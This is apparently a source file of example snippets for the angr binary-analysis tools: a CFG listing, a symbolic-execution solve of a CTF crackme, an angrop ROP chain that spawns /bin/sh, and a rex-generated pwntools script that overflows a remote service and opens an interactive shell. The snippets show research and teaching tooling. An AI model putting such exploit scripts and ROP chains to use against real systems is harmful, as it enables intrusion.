@@ -1,0 +1,97 @@
+cfg = '''
+>>> import angr
+>>> proj = angr.Project('./fauxware')
+>>> cfg = proj.analyses.CFG()
+>>> dict(proj.kb.functions)
+{4195552L: <Function _init (0x4004e0)>,
+ 4195600L: <Function plt.puts (0x400510)>,
+ 4195616L: <Function plt.printf (0x400520)>,
+ 4195632L: <Function plt.read (0x400530)>,
+ 4195648L: <Function plt.__libc_start_main (0x400540)>,
+ 4195664L: <Function plt.strcmp (0x400550)>,
+ 4195680L: <Function plt.open (0x400560)>,
+ 4195696L: <Function plt.exit (0x400570)>,
+ 4195712L: <Function _start (0x400580)>,
+ 4195756L: <Function call_gmon_start (0x4005ac)>,
+ 4195904L: <Function frame_dummy (0x400640)>,
+ 4195940L: <Function authenticate (0x400664)>,
+ 4196077L: <Function accepted (0x4006ed)>,
+ 4196093L: <Function rejected (0x4006fd)>,
+ 4196125L: <Function main (0x40071d)>,
+ 4196320L: <Function __libc_csu_init (0x4007e0)>,
+ 4196480L: <Function __do_global_ctors_aux (0x400880)>}
+'''
+
+symbolic_execution = '''
+>>> import os
+>>> import angr
+>>> project = angr.Project("defcamp_quals_2015_r100", auto_load_libs=False
+)
+>>> path_group = project.factory.path_group()
+>>> path_group.explore(find=lambda path: 'Nice!' in path.state.posix.dumps(1))
+>>> print path_group.found[0].state.posix.dumps(0)
+Code_Talkers
+
+# ./defcamp_quals_2015_r100
+Enter the password: Code_Talkers
+Nice!
+'''
+
+rop = '''
+>>> import angr
+>>> import angrop
+>>> project = angr.Project("/bin/bash", auto_load_libs=False)
+>>> rop = project.analyses.ROP()
+>>> rop.find_gadgets()
+>>> rop.execve("/bin/sh").print_payload_code()
+chain = ""
+chain += p64(0x4929bc)  # pop rax; ret
+chain += p64(0x702fb8)
+chain += p64(0x420b5c)  # pop rsi; ret
+chain += p64(0x68732f6e69622f)
+chain += p64(0x4a382a)  # mov qword ptr [rax + 8], rsi; xor eax, eax; ret
+chain += p64(0x4929bc)  # pop rax; ret
+chain += p64(0x3b)
+chain += p64(0x41e844)  # pop rdi; ret
+chain += p64(0x702fc0)
+chain += p64(0x4ed076)  # pop rdx; ret
+chain += p64(0x0)
+chain += p64(0x420b5c)  # pop rsi; ret
+chain += p64(0x0)
+chain += p64(0x401b94)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+'''
+
+patcherex = '''
+# patcherex/patch_master.py single test_binaries/CADET_00003 stackretencryption CAD ET_00003_stackretencryption
+'''
+
+rex = '''
+>>> import rex
+>>> rex.Crash("vuln_stacksmash", "A"*227).exploit().arsenal["rop_to_system"].script("x.py")
+
+# cat x.py
+import sys
+import time
+from pwn import *
+
+if len(sys.argv) < 3:
+    print "%s:  " % sys.argv[0]
+    sys.exit(1)
+
+r = remote(sys.argv[1], int(sys.argv[2]))
+r.send('\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\x82\x04\x08\x10\x83\x04\x08\xf2\x82\x04\x08\x00\x00\x00\x00\x1f\xa0\x04\x08\x08\x00\x00\x00\xde\x82\x04\x08\x83\x04\x08\xf5\x82\x04\x08\x1f\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+time.sleep(.1)
+r.send('/bin/sh\x00')
+r.interactive()
+'''
+
+angr_management = '''
+angr-management/run-docker.sh
+'''
